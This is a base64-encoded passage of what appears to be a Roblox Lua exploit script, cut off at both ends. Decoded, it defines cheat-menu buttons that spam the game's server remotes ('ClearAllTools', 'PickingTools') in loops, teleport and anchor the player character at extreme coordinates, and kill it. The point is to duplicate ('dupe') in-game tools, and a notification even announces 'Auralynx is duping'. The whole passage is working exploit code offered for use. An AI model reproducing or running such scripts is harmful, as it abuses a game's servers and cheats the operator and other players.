dhaXQoKQpsb2NhbCBodW1hbm9pZCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKCgpwcmludCgiZG9uZSIpCndhaXQoMSkKbG9jYWwgR3JpcFBvc1RhYmxlID0gewogICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIDApLAogIFZlY3RvcjMubmV3KDIwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygzMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIDApLAogIFZlY3RvcjMubmV3KDUwLCAwLCAwKSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgMCksICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAwKSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIDApLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIDApLAogIFZlY3RvcjMubmV3KC01MCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygxMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KDIwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgMzApLAogIFZlY3RvcjMubmV3KDUwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygtMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC00MCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC01MCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC02MCwgMCwgMzApLAogICAgICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygxMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDIwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDUwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygtMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC00MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC01MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC02MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygxMCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KDIwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KDUwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIDE1KSwgICAgICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAxNSksClZlY3RvcjMubmV3KDAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC0xNSksICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KC00MCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KDAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC0zMCksICAgICAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KC02MCwgMCwgLTMwKSwKICAgIFZlY3RvcjMubmV3KDAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC00NSksICAgICAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KC02MCwgMCwgLTQ1KSwKICAgIFZlY3RvcjMubmV3KDEwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDIwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDMwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDQwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDUwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDYwLCAwLCAtNjApLCAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgVmVjdG9yMy5uZXcoLTAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygtMzAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KC01MCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygtNjAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC03NSksICAgICAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KC02MCwgMCwgLTc1KSwKCgogICAgIH0KICAgICAgZm9yIGksIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICB0b29sLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICBsb2NhbCBncmlwUG9zSW5kZXggPSBtYXRoLm1pbihpLCAjR3JpcFBvc1RhYmxlKQogICAgICAgICAgICAgIGxvY2FsIGdyaXBQb3MgPSBHcmlwUG9zVGFibGVbZ3JpcFBvc0luZGV4XQogICAgICAgICAgICAgIAogICAgICAgICAgICAgIGlmIHRvb2w6SXNEZXNjZW5kYW50T2YoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcikgdGhlbgogICAgICAgICAgICAgICAgICB0b29sLkdyaXBQb3MgPSBncmlwUG9zCiAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICB3YXJuKCJUb29sIiwgdG9vbC5OYW1lLCAiaXMgbm90IGluIGNoYXJhY3RlciIpCiAgICAgICAgICAgICAgZW5kCiAgICAgICAgICBlbmQKICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEJ1dHRvbiBmb3IgU21va2UgQXVyYQpUb29sc1RhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJTbW9rZSBBdXJhIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgICAgIFRpdGxlID0gIkF1cmFseW54IGlzIGR1cGluZy4uLiIsCiAgICAgICAgICAgIFRleHQgPSAiUGxlYXNlIGRvIG5vdCBlcXVpcCBhbnkgdG9vbHMgb3IgdW5lcXVpcCB0b29scyBvciBjbGljayB0b29scyBvbiBpbnZlbnRvcnkuIEl0IHdpbGwgYnJlYWsgdGhlIHNjcmlwdC4iLAogICAgICAgICAgICBCdXR0b24xID0gIk9rIiwKICAgICAgICAgICAgRHVyYXRpb24gPSA1CiAgICAgICAgfSkKICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICBbMV0gPSAiQ2xlYXJBbGxUb29scyIKICAgICAgICB9CiAgICAgICAgY2xlYXJ0b29scmVtb3RlOkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpCiAgICAgICAgZW5kCiAgICAgICAgd2FpdCgwLjMpCiAgICAgICAgZm9yIGkgPSAxLCAxMjQgZG8KICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgIFsxXSA9ICJQaWNraW5nVG9vbHMiLAogICAgICAgICAgICAgICAgWzJdID0gIkZpcmVIb3NlIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMVRvbzFsIik6SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgIFsxXSA9ICJGaXJlSG9zZSIsCiAgICAgICAgICAgICAgICBbMl0gPSAiRGVzdHJveUZpcmVIb3NlIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrLkZpcmVIb3NlLlRvb2xTb3VuZDpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICBlbmQKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgICAgICBsb2NhbCBodW1hbm9pZCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICBpZiBodW1hbm9pZCB0aGVuCiAgICAgICAgICAgIGh1bWFub2lkLkhlYWx0aCA9IDAKICAgICAgICBlbmQKICAgICAgICB3YWl0KDgpCiAgICAgICAgbG9jYWwgR3JpcFBvc1RhYmxlID0gewogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAwLCAwKSwgVmVjdG9yMy5uZXcoMTAsIDAsIDApLCBWZWN0b3IzLm5ldygyMCwgMCwgMCksIFZlY3RvcjMubmV3KDMwLCAwLCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoNDAsIDAsIDApLCBWZWN0b3IzLm5ldyg1MCwgMCwgMCksIFZlY3RvcjMubmV3KDYwLCAwLCAwKSwgVmVjdG9yMy5uZXcoLTAsIDAsIDApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtMTAsIDAsIDApLCBWZWN0b3IzLm5ldygtMjAsIDAsIDApLCBWZWN0b3IzLm5ldygtMzAsIDAsIDApLCBWZWN0b3IzLm5ldygtNDAsIDAsIDApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtNTAsIDAsIDApLCBWZWN0b3IzLm5ldygtNjAsIDAsIDApLCBWZWN0b3IzLm5ldygwLCAwLCAzMCksIFZlY3RvcjMubmV3KDEwLCAwLCAzMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDIwLCAwLCAzMCksIFZlY3RvcjMubmV3KDMwLCAwLCAzMCksIFZlY3RvcjMubmV3KDQwLCAwLCAzMCksIFZlY3RvcjMubmV3KDUwLCAwLCAzMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDYwLCAwLCAzMCksIFZlY3RvcjMubmV3KC0wLCAwLCAzMCksIFZlY3RvcjMubmV3KC0xMCwgMCwgMzApLCBWZWN0b3IzLm5ldygtMjAsIDAsIDMwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTMwLCAwLCAzMCksIFZlY3RvcjMubmV3KC00MCwgMCwgMzApLCBWZWN0b3IzLm5ldygtNTAsIDAsIDMwKSwgVmVjdG9yMy5uZXcoLTYwLCAwLCAzMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoMTAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoMjAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoMzAsIDAsIDQ1KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoNDAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoNTAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoNjAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoLTAsIDAsIDQ1KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEwLCAwLCA0NSksIFZlY3RvcjMubmV3KC0yMCwgMCwgNDUpLCBWZWN0b3IzLm5ldygtMzAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoLTQwLCAwLCA0NSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KC01MCwgMCwgNDUpLCBWZWN0b3IzLm5ldygtNjAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoMCwgMCwgMTUpLCBWZWN0b3IzLm5ldygxMCwgMCwgMTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygyMCwgMCwgMTUpLCBWZWN0b3IzLm5ldygzMCwgMCwgMTUpLCBWZWN0b3IzLm5ldyg0MCwgMCwgMTUpLCBWZWN0b3IzLm5ldyg1MCwgMCwgMTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldyg2MCwgMCwgMTUpLCBWZWN0b3IzLm5ldygtMCwgMCwgMTUpLCBWZWN0b3IzLm5ldygtMTAsIDAsIDE1KSwgVmVjdG9yMy5uZXcoLTIwLCAwLCAxNSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KC0zMCwgMCwgMTUpLCBWZWN0b3IzLm5ldygtNDAsIDAsIDE1KSwgVmVjdG9yMy5uZXcoLTUwLCAwLCAxNSksIFZlY3RvcjMubmV3KC02MCwgMCwgMTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAwLCAtMTUpLCBWZWN0b3IzLm5ldygxMCwgMCwgLTE1KSwgVmVjdG9yMy5uZXcoMjAsIDAsIC0xNSksIFZlY3RvcjMubmV3KDMwLCAwLCAtMTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldyg0MCwgMCwgLTE1KSwgVmVjdG9yMy5uZXcoNTAsIDAsIC0xNSksIFZlY3RvcjMubmV3KDYwLCAwLCAtMTUpLCBWZWN0b3IzLm5ldygtMCwgMCwgLTE1KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEwLCAwLCAtMTUpLCBWZWN0b3IzLm5ldygtMjAsIDAsIC0xNSksIFZlY3RvcjMubmV3KC0zMCwgMCwgLTE1KSwgVmVjdG9yMy5uZXcoLTQwLCAwLCAtMTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtNTAsIDAsIC0xNSksIFZlY3RvcjMubmV3KC02MCwgMCwgLTE1KSwgVmVjdG9yMy5uZXcoMCwgMCwgLTMwKSwgVmVjdG9yMy5uZXcoMTAsIDAsIC0zMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDIwLCAwLCAtMzApLCBWZWN0b3IzLm5ldygzMCwgMCwgLTMwKSwgVmVjdG9yMy5uZXcoNDAsIDAsIC0zMCksIFZlY3RvcjMubmV3KDUwLCAwLCAtMzApLAogICAgICAgICAgICBWZWN0b3IzLm5ldyg2MCwgMCwgLTMwKSwgVmVjdG9yMy5uZXcoLTAsIDAsIC0zMCksIFZlY3RvcjMubmV3KC0xMCwgMCwgLTMwKSwgVmVjdG9yMy5uZXcoLTIwLCAwLCAtMzApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtMzAsIDAsIC0zMCksIFZlY3RvcjMubmV3KC00MCwgMCwgLTMwKSwgVmVjdG9yMy5uZXcoLTUwLCAwLCAtMzApLCBWZWN0b3IzLm5ldygtNjAsIDAsIC0zMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIC0zMCksIFZlY3RvcjMubmV3KDEwLCAwLCAtNDUpLCBWZWN0b3IzLm5ldygyMCwgMCwgLTQ1KSwgVmVjdG9yMy5uZXcoMzAsIDAsIC00NSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDQwLCAwLCAtNDUpLCBWZWN0b3IzLm5ldyg1MCwgMCwgLTQ1KSwgVmVjdG9yMy5uZXcoNjAsIDAsIC00NSksIFZlY3RvcjMubmV3KC0wLCAwLCAtNDUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtMTAsIDAsIC00NSksIFZlY3RvcjMubmV3KC0yMCwgMCwgLTQ1KSwgVmVjdG9yMy5uZXcoLTMwLCAwLCAtNDUpLCBWZWN0b3IzLm5ldygtNDAsIDAsIC00NSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KC01MCwgMCwgLTQ1KSwgVmVjdG9yMy5uZXcoLTYwLCAwLCAtNDUpLCBWZWN0b3IzLm5ldygxMCwgMCwgLTYwKSwgVmVjdG9yMy5uZXcoMjAsIDAsIC02MCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDMwLCAwLCAtNjApLCBWZWN0b3IzLm5ldyg0MCwgMCwgLTYwKSwgVmVjdG9yMy5uZXcoNTAsIDAsIC02MCksIFZlY3RvcjMubmV3KDYwLCAwLCAtNjApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtMCwgMCwgLTYwKSwgVmVjdG9yMy5uZXcoLTEwLCAwLCAtNjApLCBWZWN0b3IzLm5ldygtMjAsIDAsIC02MCksIFZlY3RvcjMubmV3KC0zMCwgMCwgLTYwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTQwLCAwLCAtNjApLCBWZWN0b3IzLm5ldygtNTAsIDAsIC02MCksIFZlY3RvcjMubmV3KC02MCwgMCwgLTYwKSwgVmVjdG9yMy5uZXcoMTAsIDAsIC03NSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDIwLCAwLCAtNzUpLCBWZWN0b3IzLm5ldygzMCwgMCwgLTc1KSwgVmVjdG9yMy5uZXcoNDAsIDAsIC03NSksIFZlY3RvcjMubmV3KDUwLCAwLCAtNzUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldyg2MCwgMCwgLTc1KSwgVmVjdG9yMy5uZXcoLTAsIDAsIC03NSksIFZlY3RvcjMubmV3KC0xMCwgMCwgLTc1KSwgVmVjdG9yMy5uZXcoLTIwLCAwLCAtNzUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtMzAsIDAsIC03NSksIFZlY3RvcjMubmV3KC00MCwgMCwgLTc1KSwgVmVjdG9yMy5uZXcoLTUwLCAwLCAtNzUpLCBWZWN0b3IzLm5ldygtNjAsIDAsIC03NSkKICAgICAgICB9CiAgICAgICAgZm9yIGksIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICBsb2NhbCBncmlwUG9zSW5kZXggPSBtYXRoLm1pbihpLCAjR3JpcFBvc1RhYmxlKQogICAgICAgICAgICAgICAgbG9jYWwgZ3JpcFBvcyA9IEdyaXBQb3NUYWJsZVtncmlwUG9zSW5kZXhdCiAgICAgICAgICAgICAgICBpZiB0b29sOklzRGVzY2VuZGFudE9mKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIpIHRoZW4KICAgICAgICAgICAgICAgICAgICB0b29sLkdyaXBQb3MgPSBncmlwUG9zCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgd2FybigiVG9vbCAiLCB0b29sLk5hbWUsICIgaXMgbm90IGluIHRoZSBjaGFyYWN0ZXIuIikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gU2VjdGlvbiBmb3IgU3BlY2lhbCBHcmlwClNlY3Rpb24gPSBUb29sc1RhYjpBZGRTZWN0aW9uKHsKICAgIE5hbWUgPSAi8J+Sq++4sVNwZWNpYWwgZ3JpcCIKfSkKCi0tIEJ1dHRvbiBmb3IgQmxhY2sgQmFyClRvb2xzVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkJsYWNrIEJhciIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgb2xkY2ZyYW1lID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQogICAgICAgICAgICAgICAgdG9vbHRoYXRpd2FudHRvZHVwZSA9ICJCb3giCiAgICAgICAgICAgICAgICB0b29scyA9ICJCb3giCiAgICAgICAgICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9PSB0cnVlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPSBmYWxzZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICB3YWl0KDAuMSkKICAgICAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFsxXSA9ICJDbGVhckFsbFRvb2xzIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBjbGVhcnRvb2xyZW1vdGU6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgIGZvciBtPTEsMiBkbyB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5OTk5OTkuNDE0LCAtNDkwLCA5OTk5OTk5OTkuNDE0LCAwLjk3NDM2MDQwNiwgLTAuMTc1NzM0MDg4LCAwLjE0MDQ5NzYxLCAtMC4xMzM0NDE0MDQsIDAuMDUxNDA1MzA2OSwgMC45ODk3MjI3MjksIC0wLjE4MTE1MDMwMiwgLTAuOTgzMDk0NjkyLCAwLjAyNjYzNzA5MjIpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgICAgICAgICB3YWl0KDAuMykKICAgICAgICAgICAgICAgIGR1cGluZyA9IHRydWUKICAgICAgICAgICAgICAgIGZvciBtPTEsIDc2IGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMV0gPSAiUGlja2luZ1Rvb2xzIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMl0gPSB0b29sdGhhdGl3YW50dG9kdXBlCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHBpY2t0b29scmVtb3RlOkludm9rZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOldhaXRGb3JDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxhe